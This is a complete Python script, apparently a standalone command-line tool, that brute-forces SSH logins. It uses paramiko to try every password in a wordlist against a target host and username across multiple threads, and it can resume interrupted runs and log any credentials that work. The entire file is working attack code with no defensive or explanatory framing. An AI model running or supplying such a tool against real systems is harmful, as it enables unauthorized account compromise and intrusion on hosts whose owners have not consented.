import paramiko
import sys
import os
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import datetime

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description='SSH Brute Force Tool')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-u', '--username', help='Username to bruteforce')
    parser.add_argument('-p', '--password-file', help='Path to password file')
    parser.add_argument('-P', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-T', '--threads', type=int, default=4, help='Number of threads (default: 4)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('--resume', help='Resume from a specific line number in password file')
    return parser.parse_args()

def ssh_connect(target, port, username, password, timeout=5, code=0):
    """Try to connect to target using SSH with the given credentials."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
    except paramiko.AuthenticationException:
        code = 1
    except paramiko.SSHException:
        code = 2
    except Exception:
        code = 3
    finally:
        ssh.close()
    
    return code

def attempt_login(target, port, username, password, verbose, timeout, delay=0):
    """Attempt to login with provided credentials and handle the output."""
    if delay > 0:
        time.sleep(delay)
        
    response = ssh_connect(target, port, username, password, timeout)
    result = None
    
    if response == 0:
        result = f"[+] SUCCESS: Password found: {password}"
    elif response == 1:
        if verbose:
            result = f"[-] FAILED: {username}@{target}:{port} - Password: {password}"
    elif response == 2:
        result = f"[!] ERROR: SSH connection error - {password}"
    elif response == 3:
        result = f"[!] ERROR: Connection error - {password}"
    
    return result, response, password

def save_progress(output_file, password, success=False):
    """Save progress to the output file."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(output_file, 'a') as f:
        if success:
            f.write(f"[{timestamp}] SUCCESS - Password: {password}\n")
        else:
            f.write(f"[{timestamp}] Last attempted password: {password}\n")

def handle_interrupt(passwords_tried, current_password, output_file=None):
    """Handle keyboard interrupt gracefully."""
    print(f"\n\n[*] Exiting after trying {passwords_tried} passwords")
    print(f"[*] Last password attempted: {current_password}")
    
    if output_file:
        save_progress(output_file, current_password)
    
    print("[*] You can resume later using --resume option")
    sys.exit(1)

def main():
    """Main function to execute the brute force attack."""
    args = parse_args()
    
    # Interactively get parameters if not provided via command line
    target = args.target if args.target else input('Please enter target IP address: ')
    username = args.username if args.username else input('Please enter username to bruteforce: ')
    password_file = args.password_file if args.password_file else input('Please enter location of the password file: ')
    
    # Validate input file
    if not os.path.isfile(password_file):
        print(f"[!] Error: Password file '{password_file}' not found")
        sys.exit(1)
    
    # Count total passwords for progress reporting
    try:
        total_passwords = sum(1 for _ in open(password_file, 'r', errors='ignore'))
    except UnicodeDecodeError:
        # Fallback to binary mode if UTF-8 decoding fails
        total_passwords = sum(1 for _ in open(password_file, 'rb'))
    print(f"[*] Loaded {total_passwords} passwords from {password_file}")
    
    # Set up output file if specified
    output_file = args.output
    if output_file:
        with open(output_file, 'a') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] Starting brute force on {username}@{target}:{args.port}\n")
    
    # Set up resume functionality
    start_line = 0
    if args.resume and args.resume.isdigit():
        start_line = int(args.resume)
        print(f"[*] Resuming from line {start_line}")
    
    passwords_tried = 0
    current_password = ""
    
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            with open(password_file, 'r', errors='ignore') as file:
                futures = []
                
                # Skip to resume point if specified
                if start_line > 0:
                    for _ in range(start_line):
                        next(file, None)
                
                # Submit tasks for password attempts
                for i, line in enumerate(file):
                    password = line.strip()
                    if password:
                        current_password = password
                        future = executor.submit(
                            attempt_login, 
                            target, 
                            args.port, 
                            username, 
                            password, 
                            args.verbose, 
                            args.timeout,
                            args.delay
                        )
                        futures.append(future)
                        passwords_tried = i + 1 + start_line
                        
                        # Print progress periodically
                        if passwords_tried % 10 == 0:
                            percent = (passwords_tried / total_passwords) * 100
                            print(f"\r[*] Progress: {passwords_tried}/{total_passwords} ({percent:.2f}%)", end="")
                
                # Process results
                for future in futures:
                    result, response, password = future.result()
                    
                    if result and (args.verbose or response == 0):
                        print(f"\r{result}")
                    
                    # Handle successful login
                    if response == 0:
                        print(f"\n[+] Authentication successful!")
                        print(f"[+] Target: {username}@{target}:{args.port}")
                        print(f"[+] Password: {password}")
                        
                        if output_file:
                            save_progress(output_file, password, success=True)
                        
                        return True
                
        print(f"\n[-] Exhausted password list ({passwords_tried} passwords)")
        print("[-] No valid password found")
        return False
                    
    except KeyboardInterrupt:
        handle_interrupt(passwords_tried, current_password, output_file)

if __name__ == "__main__":
    main()
